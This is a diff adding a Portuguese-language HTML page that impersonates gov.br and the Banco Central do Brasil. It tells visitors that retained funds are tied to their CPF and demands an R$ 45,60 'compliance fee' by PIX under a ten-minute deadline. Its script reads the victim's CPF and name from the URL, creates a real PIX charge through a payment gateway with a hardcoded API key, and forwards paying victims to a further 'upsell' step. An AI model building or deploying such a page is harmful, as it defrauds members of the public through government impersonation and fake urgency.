@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Certificado de Conformidade e Desbloqueio</title>
+  
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  
+  <style>
+    :root {
+      --gov-navy: #0f2744;
+      --gov-blue: #1351b4;
+      --gov-accent: #059669;
+      --radius: 16px;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background: #f8fafc;
+      color: #1e293b;
+      margin: 0;
+      padding: 0;
+    }
+    .taxa-row {
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 10px 12px; font-size: 0.85rem; border-bottom: 1px solid #e2e8f0;
+    }
+    .taxa-row:last-child { border-bottom: none; }
+    .taxa-label { color: #64748b; font-weight: 500; }
+    .taxa-value { color: #0f172a; font-weight: 700; }
+    .btn-pulse { animation: pulse 2s infinite; }
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); box-shadow: 0 4px 14px rgba(19,81,180,0.3); }
+      50% { transform: scale(1.02); box-shadow: 0 6px 20px rgba(19,81,180,0.5); }
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between">
+
+  <!-- TOPBAR GOV.BR -->
+  <header class="bg-[#0f2744] text-white py-3 px-4 shadow-md sticky top-0 z-30">
+    <div class="max-w-xl mx-auto flex items-center justify-between">
+      <div class="flex items-center gap-2">
+        <span class="font-black text-xl tracking-tight text-white">gov.br</span>
+        <span class="text-xs bg-blue-700/60 px-2 py-0.5 rounded text-blue-200 uppercase font-bold">Oficial</span>
+      </div>
+      <div class="text-right">
+        <div id="u-nome" class="text-xs font-bold text-slate-100">Vendas</div>
+        <div id="u-cpf" class="text-[11px] text-blue-300 font-mono">000.***.***-00</div>
+      </div>
+    </div>
+  </header>
+
+  <!-- CONTEUDO PRINCIPAL -->
+  <main class="max-w-xl w-full mx-auto px-4 py-6 flex-1 space-y-4">
+    
+    <!-- ETAPA ATUAL -->
+    <div class="bg-blue-50 border border-blue-200 rounded-xl p-3 flex items-center justify-between text-xs">
+      <span class="font-bold text-blue-900 flex items-center gap-1.5">
+        <i class="fa-solid fa-shield-halved text-blue-600"></i> Etapa 3 de 4
+      </span>
+      <span class="text-blue-700 font-medium">Certificado de Conformidade e Desbloqueio</span>
+    </div>
+
+    <!-- ALERTA DE PENDENCIA -->
+    <div class="bg-white rounded-2xl border border-red-200 shadow-sm overflow-hidden">
+      <div class="bg-red-500 text-white px-4 py-2.5 flex items-center gap-2 font-bold text-sm">
+        <i class="fa-solid fa-triangle-exclamation"></i>
+        <span>SALDO RESIDUAL RETIDO LOCALIZADO</span>
+      </div>
+      <div class="p-5 space-y-3 text-sm text-slate-700 leading-relaxed">
+        <p>O Banco Central localizou um lote de valores retidos adicionais vinculado ao seu CPF. Para emiss&atilde;o do termo de quita&ccedil;&atilde;o e desbloqueio total dos valores, efetue o recolhimento da taxa de conformidade.</p>
+        <div class="bg-amber-50 border border-amber-200 rounded-lg p-3 text-amber-900 text-xs flex items-center gap-2 font-medium">
+          <i class="fa-solid fa-clock text-amber-600 text-base shrink-0"></i>
+          <span>Prazo de liquida&ccedil;&atilde;o: <strong>10 minutos</strong> antes do cancelamento da ordem.</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- DETALHAMENTO DE TAXAS -->
+    <div class="bg-white rounded-2xl border border-slate-200 shadow-sm p-4">
+      <div class="flex items-center gap-2 font-bold text-slate-800 text-sm mb-3 pb-2 border-b border-slate-100">
+        <i class="fa-solid fa-receipt text-blue-600"></i>
+        <span>Detalhamento dos Encargos</span>
+      </div>
+      
+      <div class="space-y-1">
+                  <div class="taxa-row">
+            <span class="taxa-label">Emiss&atilde;o do Termo de Quita&ccedil;&atilde;o</span>
+            <span class="taxa-value">R$ 28,40</span>
+          </div>          <div class="taxa-row">
+            <span class="taxa-label">Desbloqueio de saldo complementar</span>
+            <span class="taxa-value">R$ 17,20</span>
+          </div>
+        <div class="taxa-row bg-slate-50 rounded-lg mt-2 p-3 font-black text-base border border-slate-200">
+          <span class="text-slate-900 font-bold">Valor Total</span>
+          <span class="text-blue-700 text-lg">R$ 45,60</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- BOTAO DE ACAO -->
+    <button id="btn-pay" onclick="gerarPixUpsell()" class="w-full bg-[#1351b4] hover:bg-blue-700 text-white font-extrabold py-4 px-6 rounded-xl shadow-lg transition btn-pulse text-center flex items-center justify-center gap-3 text-base cursor-pointer">
+      <i class="fa-brands fa-pix text-xl text-emerald-400"></i>
+      <span>DESBLOQUEAR SALDO COMPLETO</span>
+    </button>
+
+    <div class="text-center">
+      <span class="text-[11px] text-slate-400 flex items-center justify-center gap-1">
+        <i class="fa-solid fa-lock text-emerald-600"></i> Ambiente Seguro com Criptografia de Ponta a Ponta
+      </span>
+    </div>
+
+  </main>
+
+  <!-- MODAL CHECKOUT FASTSOFT PIX -->
+  <div id="modal-pix" class="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4">
+    <div class="bg-white rounded-3xl max-w-md w-full p-6 text-center space-y-4 shadow-2xl relative">
+      
+      <div class="flex items-center justify-between border-b border-slate-100 pb-3">
+        <div class="flex items-center gap-2">
+          <i class="fa-brands fa-pix text-emerald-600 text-2xl"></i>
+          <span class="font-bold text-slate-800 text-sm">Pagamento via PIX</span>
+        </div>
+        <span class="text-xs bg-emerald-100 text-emerald-800 font-bold px-2 py-0.5 rounded">Valor: R$ 45,60</span>
+      </div>
+
+      <!-- LOADING -->
+      <div id="pix-loading" class="py-8 space-y-3">
+        <div class="w-10 h-10 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
+        <p class="text-sm font-semibold text-slate-600">Gerando cobran&ccedil;a PIX oficial...</p>
+      </div>
+
+      <!-- QR CODE CONTAINER -->
+      <div id="pix-content" class="hidden space-y-4">
+        <div class="p-3 bg-slate-50 border border-slate-200 rounded-2xl inline-block mx-auto shadow-inner">
+          <div id="qrcode-box" class="flex justify-center"></div>
+        </div>
+
+        <div>
+          <p class="text-xs text-slate-500 mb-2">Copie o c&oacute;digo abaixo e pague em qualquer aplicativo banc&aacute;rio:</p>
+          <div class="flex gap-2">
+            <input type="text" id="pix-code" readonly class="w-full bg-slate-100 border border-slate-300 rounded-xl px-3 py-2 text-xs font-mono select-all">
+            <button onclick="copiarPix()" id="btn-copy" class="bg-emerald-600 hover:bg-emerald-700 text-white font-bold px-4 py-2 rounded-xl text-xs shrink-0 transition flex items-center gap-1">
+              <i class="fa-solid fa-copy"></i> Copiar
+            </button>
+          </div>
+        </div>
+
+        <div class="bg-emerald-50 border border-emerald-200 rounded-xl p-3 text-xs text-emerald-800 flex items-center justify-center gap-2 font-semibold animate-pulse">
+          <i class="fa-solid fa-arrows-rotate animate-spin"></i>
+          <span>Aguardando confirma&ccedil;&atilde;o de pagamento...</span>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="bg-slate-900 text-slate-400 py-4 px-4 text-center text-xs border-t border-slate-800">
+    <p>&copy; 2026 Sistema de Pagamentos Brasileiro &mdash; Banco Central do Brasil</p>
+  </footer>
+
+  <script>
+    const TECHBYNET_KEY = "f3496353-b145-431a-91ac-1e47968b5b6f";
+    let urlParams = new URLSearchParams(window.location.search);
+    let rawCpf = urlParams.get('cpf') || localStorage.getItem('userCPF') || '';
+    let cpf = rawCpf.replace(/\D/g, '') || "07580365316";
+    let nome = (urlParams.get('nome') || localStorage.getItem('userName') || 'Vendas da Silva').trim();
+
+    if (nome && nome !== 'Vendas da Silva') {
+      document.getElementById('u-nome').textContent = nome;
+      try { localStorage.setItem('userName', nome); } catch(e){}
+    }
+    if (cpf && cpf.length === 11) {
+      document.getElementById('u-cpf').textContent = cpf.slice(0,3) + '.***.***-' + cpf.slice(-2);
+      try { localStorage.setItem('userCPF', cpf); } catch(e){}
+    }
+
+    let transactionId = null;
+    let pollInterval = null;
+
+    async function gerarPixUpsell() {
+      document.getElementById('modal-pix').classList.remove('hidden');
+      document.getElementById('pix-loading').classList.remove('hidden');
+      document.getElementById('pix-content').classList.add('hidden');
+
+      let payload = {
+        amount: 4560,
+        paymentMethod: "PIX",
+        customer: {
+          name: nome || "Cliente",
+          email: "cliente" + cpf.slice(0,6) + "@email.com",
+          document: {
+            number: cpf || "33512403840",
+            type: "CPF"
+          },
+          phone: "11999999999",
+          externalRef: "ref-" + Date.now(),
+          address: {
+            street: "Avenida Paulista",
+            streetNumber: "100",
+            complement: "Sala 1",
+            zipCode: "01311-000",
+            neighborhood: "Bela Vista",
+            city: "São Paulo",
+            state: "SP",
+            country: "BR"
+          }
+        },
+        shipping: {
+          fee: 0,
+          address: {
+            street: "Avenida Paulista",
+            streetNumber: "100",
+            complement: "Sala 1",
+            zipCode: "01311-000",
+            neighborhood: "Bela Vista",
+            city: "São Paulo",
+            state: "SP",
+            country: "BR"
+          }
+        },
+        items: [{
+          title: "Servicos e Taxas",
+          unitPrice: 4560,
+          quantity: 1,
+          tangible: false,
+          externalRef: "item-1"
+        }],
+        pix: { expiresInDays: 1 }
+      };
+
+      try {
+        let res = await fetch("https://api-gateway.techbynet.com/api/user/transactions", {
+          method: "POST",
+          headers: {
+            "x-api-key": TECHBYNET_KEY,
+            "User-Agent": "AtivoB2B/1.0",
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+        let data = await res.json();
+        let code = data?.data?.pix?.qrcode || data?.data?.qrCode;
+        if (data && data.data && code) {
+          transactionId = data.data.id;
+
+          document.getElementById('pix-code').value = code;
+          document.getElementById('qrcode-box').innerHTML = "";
+          new QRCode(document.getElementById('qrcode-box'), {
+            text: code,
+            width: 180,
+            height: 180
+          });
+
+          document.getElementById('pix-loading').classList.add('hidden');
+          document.getElementById('pix-content').classList.remove('hidden');
+
+          iniciarVerificacaoStatus(transactionId);
+        } else {
+          console.error("TechByNet Error:", data);
+          alert("Nao foi possivel gerar a cobranca. Tente novamente.");
+          document.getElementById('modal-pix').classList.add('hidden');
+        }
+      } catch(err) {
+        console.error("Fetch Error:", err);
+        alert("Erro de conexao com o gateway. Tente novamente.");
+        document.getElementById('modal-pix').classList.add('hidden');
+      }
+    }
+
+    function copiarPix() {
+      let input = document.getElementById('pix-code');
+      input.select();
+      input.setSelectionRange(0, 99999);
+      navigator.clipboard.writeText(input.value);
+      let btn = document.getElementById('btn-copy');
+      btn.innerHTML = '<i class="fa-solid fa-check"></i> Copiado!';
+      btn.classList.replace('bg-emerald-600', 'bg-blue-600');
+      setTimeout(() => {
+        btn.innerHTML = '<i class="fa-solid fa-copy"></i> Copiar';
+        btn.classList.replace('bg-blue-600', 'bg-emerald-600');
+      }, 2000);
+    }
+
+    function iniciarVerificacaoStatus(id) {
+      if (pollInterval) clearInterval(pollInterval);
+      pollInterval = setInterval(async () => {
+        try {
+          let res = await fetch("https://api-gateway.techbynet.com/api/user/transactions/" + id, {
+            method: "GET",
+            headers: {
+              "x-api-key": TECHBYNET_KEY,
+              "User-Agent": "AtivoB2B/1.0"
+            }
+          });
+          let json = await res.json();
+          if (json && json.data) {
+            let st = String(json.data.status || "").toUpperCase();
+            if (st === "PAID" || st === "APPROVED" || st === "COMPLETED") {
+              clearInterval(pollInterval);
+              
+              let p = window.location.pathname;
+              let bp = "";
+              if (p.indexOf("/replay/9345488724234") !== -1) bp = "/replay/9345488724234";
+              else if (p.indexOf("/9345488724234") !== -1) bp = "/9345488724234";
+              else if (p.indexOf("/replay") !== -1) bp = "/replay";
+
+              let nextUrl = bp + "/upsell/4/" + "?cpf=" + encodeURIComponent(cpf) + "&nome=" + encodeURIComponent(nome);
+              window.location.href = nextUrl;
+            }
+          }
+        } catch(e){}
+      }, 2500);
+    }
+  </script>
+</body>
+</html>
